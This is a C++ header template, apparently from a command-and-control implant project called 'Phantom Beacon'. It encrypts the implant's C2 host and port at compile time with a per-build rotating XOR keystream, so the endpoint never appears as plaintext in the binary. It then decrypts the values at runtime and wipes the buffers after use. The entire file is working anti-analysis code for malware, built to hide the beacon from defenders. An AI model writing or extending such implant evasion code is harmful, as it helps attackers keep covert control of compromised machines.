#pragma once
// ============================================================================
//  config_encrypted.h — Phantom Beacon Encrypted Config Layer
//  ──────────────────────────────────────────────────────────────────
//  C2_HOST and C2_PORT are XOR-encrypted at compile time so they never
//  appear as plaintext in the binary. Decrypted at runtime into C2Config.
//  The XOR key is derived from a compile-time seed that changes per build.
//
//  THIS is the tracked template (config_encrypted.h.in): builder.py
//  materialises config_encrypted.h from it with a fresh random seed, and
//  rotates that seed on every build. The generated header is deliberately
//  untracked (see .gitignore / scripts/ci_beacon_lint.py).
// ============================================================================

#include <cstdint>
#include <cstddef>
#include <cstring>

// ── Compile-time key derivation ────────────────────────────────────────────
// Seed rotates per build (set by builder.py). Uses a simple LCG to generate
// a 32-byte XOR keystream deterministically from the seed.

namespace config_enc {

constexpr uint64_t CONFIG_SEED = 0x@CONFIG_SEED@ULL;

// Simple compile-time PRNG: xorshift64*
constexpr uint64_t _xorshift_next(uint64_t state) {
    state ^= state >> 12;
    state ^= state << 25;
    state ^= state >> 27;
    return state * 0x2545F4914F6CDD1DULL;
}

// Generate a keystream byte at compile time
constexpr uint8_t _key_byte(int idx) {
    uint64_t state = CONFIG_SEED;
    for (int i = 0; i <= idx / 8; ++i)
        state = _xorshift_next(state);
    return static_cast<uint8_t>(state >> ((idx % 8) * 8));
}

// Encrypt a char at compile time
template <size_t N>
constexpr void _encrypt_string(const char (&input)[N],
                                char (&output)[N],
                                int key_offset = 0) {
    for (size_t i = 0; i < N; ++i)
        output[i] = input[i] ^ _key_byte(static_cast<int>(i) + key_offset);
}

template <size_t N>
struct EncryptedConfigString {
    char data[N]{};
    static constexpr size_t length = N;

    constexpr EncryptedConfigString(const char (&str)[N], int key_offset = 0) {
        _encrypt_string(str, data, key_offset);
    }

    void decrypt(char* out, int key_offset = 0) const {
        for (size_t i = 0; i < N; ++i)
            out[i] = data[i] ^ _key_byte(static_cast<int>(i) + key_offset);
        // Ensure null termination
        out[N - 1] = '\0';
    }
};

// ── Encrypted values generated at build time ───────────────────────────────
// These are defined as `extern` here; the actual encrypted values are
// provided by builder.py in a generated config_data.cpp or via -D flags.

#ifdef C2_HOST_ENC_0
    // Builder passed encrypted bytes via -D defines
    #define C2_HOST_ENC_BYTES { C2_HOST_ENC_0, C2_HOST_ENC_1, C2_HOST_ENC_2, C2_HOST_ENC_3, \
        C2_HOST_ENC_4, C2_HOST_ENC_5, C2_HOST_ENC_6, C2_HOST_ENC_7, \
        C2_HOST_ENC_8, C2_HOST_ENC_9, C2_HOST_ENC_10, C2_HOST_ENC_11, \
        C2_HOST_ENC_12, C2_HOST_ENC_13, C2_HOST_ENC_14, C2_HOST_ENC_15, \
        C2_HOST_ENC_16, C2_HOST_ENC_17, C2_HOST_ENC_18, C2_HOST_ENC_19, \
        C2_HOST_ENC_20, C2_HOST_ENC_21, C2_HOST_ENC_22, C2_HOST_ENC_23, \
        C2_HOST_ENC_24, C2_HOST_ENC_25, C2_HOST_ENC_26, C2_HOST_ENC_27, \
        C2_HOST_ENC_28, C2_HOST_ENC_29, C2_HOST_ENC_30, C2_HOST_ENC_31, \
        C2_HOST_ENC_32, C2_HOST_ENC_33, C2_HOST_ENC_34, C2_HOST_ENC_35, \
        C2_HOST_ENC_36, C2_HOST_ENC_37, C2_HOST_ENC_38, C2_HOST_ENC_39, \
        C2_HOST_ENC_40, C2_HOST_ENC_41, C2_HOST_ENC_42, C2_HOST_ENC_43, \
        C2_HOST_ENC_44, C2_HOST_ENC_45, C2_HOST_ENC_46, C2_HOST_ENC_47, \
        C2_HOST_ENC_48, C2_HOST_ENC_49, C2_HOST_ENC_50, C2_HOST_ENC_51, \
        C2_HOST_ENC_52, C2_HOST_ENC_53, C2_HOST_ENC_54, C2_HOST_ENC_55, \
        C2_HOST_ENC_56, C2_HOST_ENC_57, C2_HOST_ENC_58, C2_HOST_ENC_59, \
        C2_HOST_ENC_60, C2_HOST_ENC_61, C2_HOST_ENC_62, C2_HOST_ENC_63 }
    constexpr size_t C2_HOST_ENC_LEN = 64;
#else
    // Fallback: builder didn't supply encrypted bytes → use plaintext with
    // runtime obfuscation. The plaintext is still obfuscated via XOR_STR.
    #define C2_HOST_ENC_LEN 0
#endif

// ── Runtime decryption helpers ──────────────────────────────────────────────

/// Decrypt a string that was encrypted with the compile-time PRNG keystream.
/// @param encrypted    pointer to encrypted bytes
/// @param length       number of encrypted bytes
/// @param out          output buffer (must be at least length + 1)
/// @param key_offset   offset into keystream (so host/port use different keys)
inline void decrypt_config(const char* encrypted, size_t length,
                            char* out, int key_offset = 0) {
    for (size_t i = 0; i < length; ++i)
        out[i] = encrypted[i] ^ _key_byte(static_cast<int>(i) + key_offset);
    out[length] = '\0';
}

/// XOR-wipe a buffer after use
inline void wipe_buffer(char* buf, size_t len) {
    volatile char* p = buf;
    for (size_t i = 0; i < len; ++i) p[i] = 0;
}

}  // namespace config_enc
